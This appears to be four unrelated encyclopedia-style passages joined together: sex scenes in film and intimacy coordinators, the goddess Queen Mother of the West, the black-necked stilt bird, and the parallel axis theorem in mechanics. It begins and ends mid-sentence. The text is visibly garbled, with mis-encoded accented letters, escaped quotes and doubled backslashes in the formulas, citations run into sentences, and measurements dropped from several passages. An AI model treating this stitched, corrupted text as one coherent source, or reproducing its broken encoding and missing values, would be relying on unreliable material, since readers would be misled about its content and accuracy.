is also regulated, as is the consequences of a performer agreeing to a nude scene but later deciding against doing it. The agreements apply to auditions too. To tackle the physical and psychological safety of the actors involved in sex scenes, Intimacy Directors International (IDI), a not for profit organization, was established. According to IDI, IDI provides an intimacy coordinator who works with actors and does following: # Work professionally with actors to set rules when they engage in any type of sex scenes that includes simulated sex, nudity, and intimate scenes. # They are a bridge between actors and producers. # Direct scenes where it includes simulated sex, nudity and intimacy scenes. # Support actors and advocate for them. Production companies can hire an intimacy coordinator in the following situations: * if the scene includes simulated sex or nudity of any kind, and they need a nudity rider, then they should hire an intimacy coordinator. * if an actor needs help in dealing with sensitive material. * if the director needs help directing a sex scene. * if the production company wants to make specific rules for the actors to feel safer. Since the 2010s, film and TV productions increasingly employ intimacy coordinators to ensure the wellbeing of actors who participate in sex scenes, and to help prevent harassment and violations of consent. Europe Pedro Almod√≥var of Spain is a prolific director who has included eroticism in many of his movies. Tinto Brass of Italy has dedicated his career to bringing explicit sexuality into mainstream cinema. His films are also notable for feminist-friendly eroticism. French filmmaker Catherine Breillat caused controversy with unsimulated sex in her films Romance (1999) and Anatomy of Hell (2004). In Italy, nudity and strong sexual themes go back to the silent era with films such as The Last Days of Pompeii (1926). Lars von Trier of Denmark has included explicit/unsimulated sex scenes in some of his films, such as Breaking the Waves (1996), The Idiots (1998), Manderlay (2005), Antichrist (2009), and Nymphomaniac (2013). He is also a co-founder of film company Puzzy Power, a subsidiary of his Zentropa, with the goal of producing hardcore pornographic films for women. Blue is the Warmest Colour (2013) sparked an international firestorm over its frank depiction of sexuality between two young women, yet managed to win the Palme d'Or, the highest prize awarded at the prestigious Cannes Film Festival in May 2013. Love (2015) contains many explicit unsimulated sex scenes. The Finnish black comedy film Dogs Don't Wear Pants (2019) presents the viewer with a dive into the dark-toned world of BDSM.Mark Kermode: Dogs Don‚Äôt Wear Pants review ‚Äì darkly humorous BDSM tale. The Guardian, 22 March 2020. United States Lorna (1964) was the first of Russ Meyer's films where the main female part, played in this film by Lorna Maitland, was selected on the basis of her large breast size The inclusion in film of any form of sexuality has been controversial since the development of the medium. Kissing in films, for example, was initially considered by some to be scandalous. The Kiss (1896) contained a kiss, which was regarded as a sex scene and drew general outrage from movie goers, civic leaders, and religious leaders, as utterly shocking, obscene and completely immoral. One contemporary critic wrote, \\"The spectacle of the prolonged pasturing on each other's lips was beastly enough in life size on the stage but magnified to gargantuan proportions and repeated three times over it is absolutely disgusting.\\"The Chap-book, Volume 5, Number 5, July 15, 1896 The Catholic Church called for censorship and moral reform - because kissing in public at the time could lead to prosecution.Sex in Cinema: Pre-1920s Perhaps in defiance of the righteous indignation and \\"to spice up a film\\", the film was followed by many kiss imitators, including The Kiss in the Tunnel (1899) and The Kiss (1900). Other producers would take the criticism on board, or in mock of the standard, and use an implicit kiss, which would be obstructed from view just as the lips would touch, such as shielding a possible kiss by placing say a hat in front of the actors' faces, or fading to grey just as a kiss is to take place, etc. The display of cleavage created controversy. For example, producer Howard Hughes displayed Jane Russell's cleavage in The Outlaw (1943) and in The French Line (1953), which was found objectionable under the Hays Code because of Russell's \\"breast shots in bathtub, cleavage and breast exposure\\" while some of her decollete gowns were regarded to be \\"intentionally designed to give a bosom peep-show effect beyond even extreme decolletage\\". Both films were condemned by the National Legion of Decency and were released only in cut versions. The selection of actresses for a role on the basis of their breast size is controversial and has been described as contributing to breast fetishism, but has proved to be a draw card. Producers such as Russ Meyer produced films which featured actresses with large breasts. Lorna (1964) was the first of his films where the main female part, played by Lorna Maitland, was selected on the basis of breast size. The producers and exhibitors of the film were prosecuted for obscenity in several US states. Other large breasted actresses used by Meyer include Kitten Natividad, Erica Gavin, Tura Satana, and Uschi Digard among many others. The majority of them were naturally large breasted and he occasionally cast women in their first trimesters of pregnancy to enhance their breast size even further. Author and director William Rotsler said: \\"with Lorna Meyer established the formula that made him rich and famous, the formula of people filmed at top hate, top lust, top heavy.\\", p.138 Blue Movie (1969), directed by Andy Warhol, was the first adult erotic film depicting explicit sex to receive wide theatrical release in the United States. Blue Movie is a seminal film in the Golden Age of Porn and, according to Warhol, a major influence in the making of Last Tango in Paris (1972), an internationally controversial erotic drama film. Another explicit adult film of that period was Mona the Virgin Nymph (1970) that contained a number of unsimulated non-penetrative sex scenes. Unlike Blue Movie, however, Mona had a plot. To forestall legal problems, the film was screened without credits. The producer of Mona, Bill Osco, went on to produce other adult films, such as Flesh Gordon (1974), Harlot (1971), and Alice in Wonderland (1976). Boys in the Sand (1971) was an American gay pornographic film, the first gay porn film to include credits, to achieve crossover success, to be reviewed by Variety,Jeffrey Escoffier, \\"Beefcake to Hardcore: Gay Pornography and the Sexual Revolution,\\" in Sex Scene. Media and the Sexual Revolution, ed. Eric Schaefer, Duke University Press, 2014, , pp. 319-347, at p. 319. and one of the earliest porn films, after Blue Movie to gain mainstream credibility, preceding Deep Throat (1972). =By genre= In North America, erotic films may be primarily character driven or plot driven, with considerable overlap. Most dramas center around character development, such as Steven Shainberg's Secretary (2002). Comedy films, especially romantic comedies and romantic dramas, tend toward character interaction. Mystery films, thrillers, drama and horror films tend toward strong plots and premises. Others combine both strong plots and characters. Thrillers Erotic thrillers are a popular American erotic subgenre, with films such as Dressed to Kill (1980), Angel Heart (1987), Basic Instinct (1992), Single White Female (1992), Color of Night (1994), Wild Things (1998), Eyes Wide Shut (1999), and The Boy Next Door (2015). In some films, the development of a sexual relationship (or even a one-night stand) is often used to create tension in the storyline, especially if the people involved should not be sleeping together, such as in Out of Sight (1998), where a U.S. Marshal has sex with the criminal she is pursuing. Horror In horror films, sex is often used to mark characters that are doomed to die. Characters that engage in sex acts are often the first to be claimed by the antagonist(s), or will die shortly after their sex scene or (sometimes) in the middle of it. This convention of it being bad luck to have sex in a horror film is notably illustrated in the Friday the 13th film series, where supernatural villain Jason Voorhees takes a special dislike to teenagers and young adults having sex because, as a young boy, he drowned in a lake while the camp counselors who should have been supervising him were having sex. In some interpretations of this \\"rule\\", the sex acts themselves directly cause the character's demise. In Cabin Fever, a man catches the deadly illness because a woman who was infected (but not yet symptomatic) seduces and has impulsive sex with him. They don't use a condom because the careless woman believes she is healthy. Ironically, the woman (and the audience) only realize that she is infected because of red welts that are brought out by their rough lovemaking. Species (1995) and its sequels also feature many sexual deaths as virtually every human who mates with an alien in the franchise subsequently dies - female aliens kill human suitors regardless of whether they have poor genes, resist the alien's advances, or mate successfully. Human women who mate with alien men die shortly after sex as their abdomens burst during the unnaturally rapid pregnancy that always follows. Most times in horror movies the typical survivor is a young girl who is still a virgin. In the film Scream, which satirizes horror movies, this rule is somewhat broken as the character Randy Meeks points out that one of the rules of horrors is to not have sex. In an intersecting scene, the film's main protagonist Sidney Prescott loses her virginity to Billy Loomis. After they finish, Billy is stabbed by Ghostface and Sidney is then chased. Randy himself survives a gunshot wound at the end of the film because, as he explains, he is a virgin. However, he dies in the sequel, Scream 2, after which it is revealed that he lost his virginity sometime prior to his death. Mexico In Mexico, many comedy films are based on sex, typically portraying men as unstoppable sex-seeking creatures and women as willing targets. Although the number of such comedies waned during the 1990s, domestic servants, bar workers, dancers and neighbors' wives continue to be depicted as potentially willing sexual partners. The films La Tarea (1991), Miracle Alley (1995) and Y Tu Mam√° Tambi√©n (2001) are some of the most important examples of this. India The entertainment industry is an important part of modern India, and is expressive of Indian society in general. Historically, Indian television (Hot series bollywood) series film has lacked the frank depiction of sex. Kissing scenes, for example, were banned by Indian film censors until the 1990s.Ray, Arnab (February 25, 2013). \\"On Kissing, Bollywood and Rebellion\\". The New York Times. Since then the entertainment industry has liberalized but the taboo against them continues well into the 2010s, with many of Bollywood stars refusing to do them, and controversy and debate sparked when actors choose to do them.Singh, Prashant (August 25, 2014). \\"What‚Äôs the big deal about a kiss, asks Bollywood\\". Hindustan Times. On the other hand, rape scenes or scenes showing sexual assault were common until approximately the early 2000s.Dias, Muditha (May 15, 2013). \\"Bollywood's culture of rape\\". ABC Mainstream films are still largely catered for the masses of India, however, art films and foreign films containing sexuality are watched by Indians. Because of the same process of glamorization of film entertainment that occurs in Hollywood, Indian cinema, mainly the Hindi-speaking Bollywood industry, is also beginning to add sexual overtones. Television Many drama series, and daytime soap operas are based around sex. This commonly revolves around the development of personal relationships of the main characters, with a view of creating sexual tension in the series. Partial nudity was considered acceptable on daytime television in the 1970s but disappeared after 2000, partly due to more conservative morals, and also to the prevalence of cable and satellite subscriptions. Only PBS occasionally features nudity. In 2008 and 2009, the French TV channel Canal+ featured a series titled X Femmes (English: X Women), which consisted of ten short films shot by female directors with the goal of producing erotica from a female point of view.  Same-sex scenes in mainstream cinema  Since approximately 2010, many mainstream films have shown sexual scenes between women. There have been various films which have been made which mainly focus on exploring the relationship between women. Because of the limited films featuring same-sex sex scenes before 2010s, researchers were unable to research people's views on the intimate scenes between women. In 2016, researchers Maria T. Soto-Sanfiel and Adriana Ibiti created a report on pleasurable sensations created by watching sexual scenes between women. People, including heterosexual individuals, reported that the scenes had different effects on their sexual arousal. The reasons were different for everyone who identified themselves as either heterosexual or homosexual, male or female. Lesbian women said that it brought back memories of their own experience and created pleasurable sensations while watching it. Heterosexual women said that they got the same pleasurable sensations as watching heterosexual sex scenes. Heterosexual men related the scenes to their memories of pornography. Gay men preferred seeing heterosexual scenes because they could imagine themselves in place of the women. French film La vie d'Ad√®le (Blue Is the Warmest Color, in English), directed by Abdellatif Kechiche, was released in October 2013. The film is about a high school student Adele who lusts after art student Lea and falls in love with her. The film explores the lesbian relationship between them and their transformation as characters. To showcase their developing characters, the three-hour long film contained almost ten minutes of sexual scenes between them. These scenes were so long that even heterosexual scenes in movies have not exceeded the length. The scenes were shot in a close-up manner, showing great detail with bold and intimate camera angles. Many critics expressed that if it was not a film, the sex scenes would be close to pornography. The sex scenes were controversial and received mixed reviews. France set the age limit to 12 years, Singapore 21 years, and Brazil opposed to print Blu-rays. The movie earned around $20 million in US and Europe. It was shown at the Cannes Film Festival and awarded the Palme d'Or, along with many other international awards. Carol, directed by Todd Haynes and released in November 2015, also caught much attention. Set during Christmas in 1952, it tells the story of a young woman named Therese Belivet (played by Rooney Mara) falling in love with an older woman named Carol Aird (played by Cate Blanchett). It includes 3 minutes of sex scenes between Carol and Theresa. They were carefully shot with the actors shown half nude, avoiding explicit scenes. Haynes, while talking about the production of the sex scenes, said that actors pretend that they are not nervous, adding: \\"But they are. So I try to create an environment that's comfortable and predictable. You set your shots, get rid of people that don't need to be there - and then you basically just go.\\" In the past, sex scenes between same-sex couple not only made the actors uncomfortable, but they were also stigmatized, considered shocking or even immoral. However, this has changed greatly and many films about same-sex relationships have been made. There is also an increasing focus on gay male relationships in cinema. An Italian film Call Me by Your Name, directed by Luca Guadagnino, was released in January 2017. Set in the summer of 1983, the film is about a 17-year-old American-Jewish man, named Elio (played by Timothee Chalamet), forming a relationship with a 24-year old graduate student Oliver. Like Carol, its sex scenes were not explicit, with its two main characters shown half naked.

Even though these inscriptions illustrate that she predates organized Taoism, she is most often associated with Taoism. From her name alone some of her most important characteristics are revealed: she is royal, female, and is associated with the west. The growing popularity of the Queen Mother of the West, as well as the beliefs that she was the dispenser of prosperity, longevity, and eternal bliss took place during the second century BC when the northern and western parts of China were able to be better known because of the opening of the Silk Road.

Commoners and poets of the era referred to her more simply as the \\"Queen Mother\\", the \\"Divine Mother\\", or simply \\"Nanny\\" (Amah). History Seiobo, Japanese art. The first mentions of the Queen Mother date back to the oracle bone inscriptions of the Shang dynasty (1766 ‚Äì 1122 BC). One inscription reads: Western Mother refers to an archaic divinity residing in the west. The exact nature of the Mother divinities in the Shang dynasty is unclear, but they were seen as powerful forces deserving of ritual by the people of the Shang dynasty. Originally, from the earliest known depictions of her in the Classic of Mountains and Seas during the Zhou dynasty, she was a ferocious goddess with the teeth of a tiger, who sent pestilence down upon the world. After her adoption into the Taoist pantheon, she was transformed into the goddess of life and immortality. Zhuangzi One of the earliest written references to the Queen Mother comes from the writings of the Taoist writer Zhuangzi (c. fourth century BC): Zhuangzi describes the Queen Mother as one of the highest of the deities, meaning she had gained immortality and celestial powers. Zhuangzi also states that Xiwangmu is seated upon a spiritual western mountain range, suggesting she is connected to not only the heavens, but also to the west. Mythological accounts in the Tang dynasty During the Tang dynasty (June 18, 618 ‚Äì June 4, 907) poetry flourished throughout China (this period is commonly known as the \\"Golden age of Chinese poetry\\"). It was during this period that the Queen Mother became an extremely popular figure in poetry. Her mythology was recorded in the poems of the Quan Tangshi, a collection of surviving poems (of an estimated 50,000 written during the period) from the Tang dynasty. After the fall of the Tang dynasty, () a Shang- ching Taoist master and court chronicler named Du Guangting wrote a hagiographical biography of the queen mother as part of his text \\"Yung ch'eng chi hsien lu\\" (\\"Records of the Assembled Transcendents of the Fortified Walled City\\"). This account represents the most complete source of information about Tang society's perceptions of Xƒ´w√°ngm«î. Iconography and representation A Liao dynasty fresco from the tomb in the mountain Pao, the first figure from left is Hsiwangmu. \\"Peach Festival of the Queen Mother of the West\\", a Ming dynasty painting from the early 17th century, by an anonymous artist. Qing dynasty porcelain with Xiwangmu. Vietnamese T√¢y V∆∞∆°ng M·∫´u on drape (c. 1800). The Queen Mother of the West usually is depicted holding court within her palace on the mythological Mount Kunlun, usually supposed to be in western China (a modern Mount Kunlun is named after this). Her palace is believed to be a perfect and complete paradise, where it was used as a meeting place for the deities and a cosmic pillar where communications between deities and humans were possible. At her palace she was surrounded by a female retinue of prominent goddesses and spiritual attendants. Although not definite there are many beliefs that her garden had a special orchard of longevity peaches which would ripen once every three thousand years, others believe though that her court on Mount Kunlun was nearby to the orchard of the Peaches of Immortality. No matter where the peaches were located, the Queen Mother of the West is widely known for serving peaches to her guests, which would then make them immortal. She normally wears a distinctive headdress with the Peaches of Immortality suspended from it. Legendary encounters In Tu Kuang-ting's text, he includes narrative accounts of the Queen Mother's encounters with legendary Chinese heroes. One such account narrates an encounter between the Queen Mother and Laozi (Lord Lao): In this account, the Queen Mother plays the role of Laozi's superior and is credited with the ultimate authorship of the Dao De Jing. This dichotomy of the Queen Mother as the superior is a characteristic of Shangqing Taoism, a goddess worshiping sect of Taoism of which Tu Kuang-ting was a master. There is also an account of a meeting between the Queen Mother and Laozi in Tang poetry. This account however, being of traditional Taoist thought, has the Queen Mother taking an inferior role to Laozi, calling him \\"Primordial Lord\\" (the title of his highest manifestation) and pays homage to the sage. Chinese rulers =Shun= The Bamboo Annals record that in the 9th year of reign of the legendary sage king Emperor Shun, \\"messengers from the western Wang-mu (Queen Mother) came to do him homage.\\" It further notes that \\"the coming to court from the Western Wang-mu was to present white stone rings and archers' thimbles of gem.\\" Shun's immediate successor was Yu the Great, who was Shun's prime minister and already present in the court at this time. =Yu the Great= The Xunzi, a third-century BC classic of statecraft written by Xun Kuang, wrote that \\"Yu studied with the Queen Mother of the West\\". This passage refers to Yu the Great, the legendary founder of the Xia dynasty, and posits that the Queen Mother of the West was Yu's teacher. It is believed that she grants Yu both legitimacy, and the right to rule, and the techniques necessary for ruling. The fact that she taught Yu gives her enormous power, since the belief in Chinese thinking is that the teacher automatically surpasses the pupil in seniority and wisdom. =King Mu of the Zhou dynasty= Joseon dynasty Korean painting \\"Yoji yeondo\\" (), depicting King Mu of Zhou visiting the Queen Mother at the Yaochi (Yoji) in the mythical Kunlun Mountain. Probably one of the best known stories of contact between a goddess and a mortal ruler is between King Mu of Zhou and the Queen Mother of the West. There are several different accounts of this story but they all agree that King Mu, one of the greatest rulers of the Zhou, set out on a trip with his eight chargers to the far western regions of his empire. As he obtains the eight chargers and has the circuit of his realm, it proves that he has the Mandate of Heaven. On his journey he encounters the Queen Mother of the West on the mythical Mount Kunlun. They then have a love affair, and King Mu, hoping to obtain immortality, gives the Queen Mother important national treasures. In the end he must return to the human realm, and does not receive immortality. The relationship between the Queen Mother of the West and King Mu has been compared to that of a Taoist master and disciple. She passes on secret teachings to him at his request and he, the disciple, fails to benefit, and dies like any other mortal. =The First Emperor of the Qin dynasty= The first emperor of the Qin dynasty, Qin Shi Huang, united the Warring States of China through brilliant military strategy and diplomacy to control the greatest territory yet seen in China. It was also under his command that workers joined pre-existing sections of wall to create the Great Wall of China. Even after these accomplishments he is known in history as a failure both as a king and as a seeker of immortality. Qin had the opportunity to meet the Queen Mother of the West and attain greatness from her, but instead wasted it and died without the Mandate of Heaven or a dynasty. His story of not jumping at the chance to meet the Queen Mother serves as a warning to later men, as despite huge and costly efforts to pursue immortality, he died and speaks no more. The ninth-century poet Zhuang Nanjie wrote: =Emperor Wu of the Han dynasty= Queen Mother of the West, earthenware, second century, Han dynasty According to legend, Emperor Wu of the Han dynasty and the Queen Mother of the West met during the height of Wu's reign, when she visited him during the night of Double Seven, the night for encounters between mortal men and divine women. When the Queen Mother of the West visits Emperor Wu she shares a banquet with him, grants him special teachings, and then departs. Emperor Wu just like King Mu before him fails to follow her teachings, and fails to put them into practice, and therefore he inevitably dies. The whole story of their meeting is described in Li Qi's long work \\"Songs of the Queen Mother\\":  Women of the Tang  As depicted in the album Famous Women, 1799 Because she was the embodiment of yin, highest goddess, and ruler of female Transcendents, The Queen Mother was seen to have had a special relationship with all women. In the beginning section of Tu Kuang-ting's hagiography, he lists the most important functions of the Queen Mother: The Queen Mother of the West was said to care for all woman Daoists in the universe, both perfected and aspirants. Tang writers frequently refer to her in poems about Daoist women. In accordance with the Shang Ch'ing vision expressed by Tu, she appears as teacher judge, registrar, and Guardian of female believers. Her forms reflect Tu's definitions. The Queen Mother was held in especially high regard by Chinese women who did not represent the societal norm of the submissive woman. To these women, The Queen Mother of the West was seen as \\"a powerful, independent deity representing the ultimate yin controlling immortality and the afterlife.\\" In popular culture Lake Heihai in the Kunlun Mountains has been associated with the Jade Pond of the Queen Mother of the West and a temple has been erected in her honor on its shore * \\"Si Wang-mu\\", named after the goddess, is a character in Orson Scott Card's Xenocide and Children of the Mind. * Xiwangmu is a character in Carrie Vaughn's Kitty's Big Trouble. * Xiwangmu appears in several of the Shin Megami Tensei games. Her latest appearance was in Shin Megami Tensei IV. * Xiwangmu is the name of a city on the planet T'ien Shan based on oriental religions in the book The Rise of Endymion by Dan Simmons, part of the Hyperion Cantos series. The planet is mountainous and therefore likely named after Tian Shan. * Xiwangmu appears as one of the heroes of Emperor: Rise of the Middle Kingdom: in the game, she boosts monument construction and can capture animals on the map. * Part Four of Amy Tan's The Joy Luck Club is titled \\"Queen Mother of the Western Skies.\\" In its prologue, a grandmother addresses her infant granddaughter, teasingly suggesting the child is the reincarnation of the Queen Mother of the West, come to share the secret of eternal happiness. * The Fountain by Darren Aronofsky contains symbols similar to those of Xiwangmu See also \\"King Father of the East\\" ‚Äì her male counterpart *Bixia *Doumu *Huxian *Jiutian Xuann√º, goddess of war, sex, and longevity as well as disciple of Xiwangmu *Kunlun Mountain (mythology) *Qingniao *Sungmo *Wusheng Laomu *Yaochidao References =Citations= =Sources= * .   .  * .

It is found from the coastal areas of California through much of the interior western United States and along the Gulf of Mexico as far east as Florida, then south through Central America and the Caribbean to Ecuador and the Gal√°pagos Islands. The northernmost populations, particularly those from inland, are migratory, wintering from the extreme south of the United States to southern Mexico, rarely as far south as Costa Rica; on the Baja California peninsula it is only found regularly in winter.Pierce (1996), Sibley (2003) Taxonomy Black-necked stilt of Quintana, Texas It is often treated as a subspecies of the common or black- winged stilt, using the trinomial name Himantopus himantopus mexicanus.E.g. Pierce (1996) However, the AOS has always considered it a species in its own right, and the scientific name Himantopus mexicanus is often seen. Matters are more complicated though; sometimes all five distinct lineages of the common stilt are treated as different species. But the white-backed stilt from southern South America (H. melanurus when the species is recognized), parapatric and intergrading to some extent with its northern relative where their ranges meet, would warrant inclusion with the black-necked stilt when this is separated specifically, becoming Himantopus mexicanus melanurus. Similarly, the Hawaiian stilt, H. m. knudseni, is likely to belong to the American species when this is considered separate; while some treat it as another distinct species, the AOS, BirdLife International and the IUCN do not. Description Flying in California, USA Measurements: * Length: 13.8-15.3 in (35-39 cm) * Weight: 5.3-6.2 oz (150-176 g) * Wingspan: 28.1-29.7 in (71.5-75.5 cm) They have long pink legs and a long thin black bill. They are white below and have black wings and backs. The tail is white with some grey banding. A continuous area of black extends from the back along the hind neck to the head. There, it forms a cap covering the entire head from the top to just below eye-level, with the exception of the areas surrounding the bill and a small white spot above the eye. Males have a greenish gloss to the back and wings, particularly in the breeding season. This is less pronounced or absent in females, which have a brown tinge to these areas instead. Otherwise, the sexes look alike.Pierce (1996) Downy young are light olive brown with lengthwise rows of black speckles (larger on the back) on the upperparts - essentially where adults are black - and dull white elsewhere, with some dark barring on the flanks. Where their ranges meet in central Brazil, the black- necked and white-backed stilts intergrade. Such individuals often have some white or grey on top of the head and a white or grey collar separating the black of the hindneck from that of the upper back. The black-necked stilt is distinguished from non-breeding vagrants of the black-winged stilt by the white spot above the eye. Vagrants of the northern American form in turn are hard to tell apart from the resident Hawaiian stilt, in which only the eye- spot is markedly smaller. But though many stilt populations are long-distance migrants and during their movements can be found hundreds of miles offshore,E.g. as a casual visitor on Clari√≥n in the Revillagigedo Islands: Brattstrom & Howell (1953) actual trans-oceanic vagrants are nonetheless a rare occurrence. Distribution and habitat The black-necked stilt is found in estuarine, lacustrine, salt pond and emergent wetland habitats; it is generally a lowland bird but in Central America has been found up to ASL and commonly seen in llanos habitat in northern South America. It is also found in seasonally flooded wetlands. Use of salt evaporation ponds has increased significantly since 1960 in the US, and they may now be the primary wintering habitat; these salt ponds are especially prevalent in southern San Francisco Bay. At the Salton Sea, the black-necked stilt is resident year-round.Garrett & Dunn (1981) This bird is locally abundant in the San Joaquin Valley, where it commonly winters.McCaskie et al. (1979) It is common to locally abundant in appropriate habitat in southern California from April to September. It also breeds along lake shores in northeastern California and southeastern Oregon as well as along the Colorado River. In North America outside California, the black-necked stilt rarely breeds inland, but it is known as a breeding bird in riparian locales in ArizonaCorman & Wise-Gervais (2005) and elsewhere in the southern USA. In Arizona, black-necked stilts may be seen along artificially created lakes and drainage basins in the Phoenix metropolitan area, in remnant riparian habitat. In the San Francisco Bay Area, specific locations where one would expect to see this bird are Richardson Bay (especially, according to mudflat bird sightings, the mouth of Pickleweed Creek),Ransom et al. (1984) mudflats of Belmont Slough, mudflats of Seal Slough in San Mateo, salt ponds in Hayward, California, exposed bay muds on the Burlingame estuarine shore, and Heron's Head Park at India Basin. For flocks that summer in the northern Central Valley of California, a migration occurs to the San Joaquin Valley to consolidate with flocks that were already summering there. In coastal areas flocks both summer and winter in these estuarine settings. Fall migration of the northernly birds takes place from July to September, and they return to the breeding grounds between March and May. Usually, the entire population breeding at any one site arrives, mates, incubates eggs for about a month, and protects and broods the young until they are capable of sustained flight (at 27‚Äì31 days old) and leaves again migrating in flocks of about 15 individuals sometimes juveniles congregating in small groups and other times siblings with family groups.Robinson, Julie A., J.

Antipredator behavior and parental care in the American Avocet and Black-necked Stilt (Aves: Recurvirostridae). Ph.D. thesis. Utah State Univ. Logan. There is some seasonal movement of the tropical populations, but this is not long-range and poorly understood. The parasitic cyclocoeline flatworm Neoallopyge americanensis was described from the air sacs of a black-necked stilt from Texas. Its genus is presently monotypic and seems to be closely related to the similar genus Allopyge, found in Old World cranes.Dronen et al. (2006) File:Black-necked stilt exhibiting a \\"broken wing\\" display (6796573671).jpgStilts exhibit a weak or sick behavior in order to distract predators from the location of their young. File:WanderingStilt.jpgBolsa Chica Ecological Reserve File:Black-necked Stilt.jpgThe Hawaiian stilt is sometimes considered a subspecies of the black-necked stilt. Food and feeding Black-necked stilts foraging on Richardson Bay mudflats The black- necked stilt forages by probing and gleaning primarily in mudflats and lakeshores, but also in very shallow waters near shores; it seeks out a range of aquatic invertebrates - mainly crustaceans and other arthropods, and mollusks - and small fish, tadpoles and very rarely plant seeds. Its mainstay food varies according to availability; inland birds usually feed mainly on aquatic insects and their larvae, while coastal populations mostly eat other aquatic invertebrates. For feeding areas they prefer coastal estuaries, salt ponds, lakeshores, alkali flats and even flooded fields. For roosting and resting needs, this bird selects alkali flats (even flooded ones), lake shores, and islands surrounded by shallow water. Breeding Black-necked stilt eggs Quintana, Texas This stilt chooses mudflats, desiccated lacustrine verges, and levees for nest locations, as long as the soil is friable. Reproduction occurs from late April through August in North America, with peak activity in June,Bent (1927) while tropical populations usually breed after the rainy season. The nests are typically sited within of a feeding location, and the pairs defend an extensive perimeter around groups of nests, patrolling in cooperation with their neighbors.Hamilton (1975) Spacing between nests is approximately , but sometimes nests are within of each other and some nests in the rookery are as far as from the nearest neighbor. The black-necked stilt is actually classified as semicolonial since the nests are rarely found alone and colonies usually number dozens, rarely hundreds of pairs.Zeiner et al. (1988) The nests are frequently established rather close to the water edge, so that their integrity is affected by rising water levels of ponds or tides. This is particularly a hazard in the case of managed salt ponds where water levels may be altered rapidly in the salt pond flooding process.Rigney & Rigney (1981) The clutch size generally is 3‚Äì5 eggs with an average of four. For 22‚Äì26 days both sexes take turns incubating the eggs. The young are so precocial that they are seen swimming within two hours after hatchingHarrison (1978) and are also capable of rapid land velocity at that early time. In spite of this early development the young normally return to the nest for resting for one or two more days. They fledge after about one month but remain dependent on their parents for some more weeks. Birds begin to breed at 1‚Äì2 years of age. Status Particularly the North American populations of the black-necked stilt have somewhat declined in the 20th century, mainly due to conversion of habitat for human use and pollution affecting both the birds directly as well as their food stocks. But altogether, the population is healthy and occurs over a large range. This stilt is therefore classified as a Species of Least Concern by the IUCN.BLI (2004b) The Hawaiian stilt, separated with the black- necked stilt in a distinct species by some (including the IUCN), is very rare however and numbers less than 2,000 individuals. Predation by the small Indian mongoose (Herpestes javanicus auropunctatus), introduced to hunt rats, is suspected to have contributed to its decline.Hays & Conant (2007)  Notes  References  * BirdLife International (BLI) [2008]: Black-necked Stilt Species Factsheet.

Mass moment of inertia The mass moment of inertia of a body around an axis can be determined from the mass moment of inertia around a parallel axis through the center of mass. Suppose a body of mass is rotated about an axis passing through the body's center of mass. The body has a moment of inertia with respect to this axis. The parallel axis theorem states that if the body is made to rotate instead about a new axis , which is parallel to the first axis and displaced from it by a distance , then the moment of inertia with respect to the new axis is related to by : I = I_\\\\mathrm{cm} + md^2. Explicitly, is the perpendicular distance between the axes and . The parallel axis theorem can be applied with the stretch rule and perpendicular axis theorem to find moments of inertia for a variety of shapes. Parallel axes rule for area moment of inertia =Derivation= We may assume, without loss of generality, that in a Cartesian coordinate system the perpendicular distance between the axes lies along the x-axis and that the center of mass lies at the origin. The moment of inertia relative to the z-axis is :I_\\\\mathrm{cm} = \\\\int (x^2 + y^2) \\\\, dm. The moment of inertia relative to the axis , which is a perpendicular distance along the x-axis from the centre of mass, is :I = \\\\int \\\\left[(x + D)^2 + y^2\\\\right] \\\\, dm. Expanding the brackets yields :I = \\\\int (x^2 + y^2) \\\\, dm + D^2 \\\\int dm + 2D\\\\int x\\\\, dm. The first term is and the second term becomes . The integral in the final term is a multiple of the x-coordinate of the center of masswhich is zero since the center of mass lies at the origin. So, the equation becomes: : I = I_\\\\mathrm{cm} + mD^2. = Tensor generalization = The parallel axis theorem can be generalized to calculations involving the inertia tensor. Let denote the inertia tensor of a body as calculated at the centre of mass. Then the inertia tensor as calculated relative to a new point is :J_{ij}=I_{ij} + m\\\\left(\\\\mathbf{R}^2 \\\\delta_{ij}-R_i R_j\\\\right), where \\\\mathbf{R}=R_1\\\\mathbf{\\\\hat{x}}+R_2\\\\mathbf{\\\\hat{y}}+R_3\\\\mathbf{\\\\hat{z}}\\\\\\\\! is the displacement vector from the centre of mass to the new point, and is the Kronecker delta. For diagonal elements (when ), displacements perpendicular to the axis of rotation results in the above simplified version of the parallel axis theorem. The generalized version of the parallel axis theorem can be expressed in the form of coordinate-free notation as : \\\\mathbf{J} = \\\\mathbf{I} + m \\\\left[\\\\left(\\\\mathbf{R} \\\\cdot \\\\mathbf{R}\\\\right) \\\\mathbf{E}_{3} - \\\\mathbf{R} \\\\otimes \\\\mathbf{R} \\\\right], where E3 is the identity matrix and \\\\otimes is the outer product. Further generalization of the parallel axis theorem gives the inertia tensor about any set of orthogonal axes parallel to the reference set of axes x, y and z, associated with the reference inertia tensor, whether or not they pass through the center of mass.A. R. Abdulghany, American Journal of Physics 85, 791 (2017); doi: https://dx.doi.org/10.1119/1.4994835 . Second moment of area The parallel axes rule also applies to the second moment of area (area moment of inertia) for a plane region D: :I_z = I_x + Ar^2, where is the area moment of inertia of D relative to the parallel axis, is the area moment of inertia of D relative to its centroid, is the area of the plane region D, and is the distance from the new axis to the centroid of the plane region D. The centroid of D coincides with the centre of gravity of a physical plate with the same shape that has uniform density. Polar moment of inertia for planar dynamics Polar moment of inertia of a body around a point can be determined from its polar moment of inertia around the center of mass. The mass properties of a rigid body that is constrained to move parallel to a plane are defined by its center of mass R = (x, y) in this plane, and its polar moment of inertia IR around an axis through R that is perpendicular to the plane. The parallel axis theorem provides a convenient relationship between the moment of inertia IS around an arbitrary point S and the moment of inertia IR about the center of mass R. Recall that the center of mass R has the property : \\\\int_V \\\\rho(\\\\mathbf{r}) (\\\\mathbf{r}-\\\\mathbf{R}) \\\\, dV=0, where r is integrated over the volume V of the body. The polar moment of inertia of a body undergoing planar movement can be computed relative to any reference point S, : I_S = \\\\int_V \\\\rho(\\\\mathbf{r}) (\\\\mathbf{r}-\\\\mathbf{S})\\\\cdot (\\\\mathbf{r}-\\\\mathbf{S}) \\\\, dV, where S is constant and r is integrated over the volume V. In order to obtain the moment of inertia IS in terms of the moment of inertia IR, introduce the vector d from S to the center of mass R, : \\\\begin{align} I_S & = \\\\int_V \\\\rho(\\\\mathbf{r}) (\\\\mathbf{r}-\\\\mathbf{R}+\\\\mathbf{d})\\\\cdot (\\\\mathbf{r}-\\\\mathbf{R}+\\\\mathbf{d}) \\\\, dV \\\\\\\\\\\\ & = \\\\int_V \\\\rho(\\\\mathbf{r}) (\\\\mathbf{r}-\\\\mathbf{R})\\\\cdot 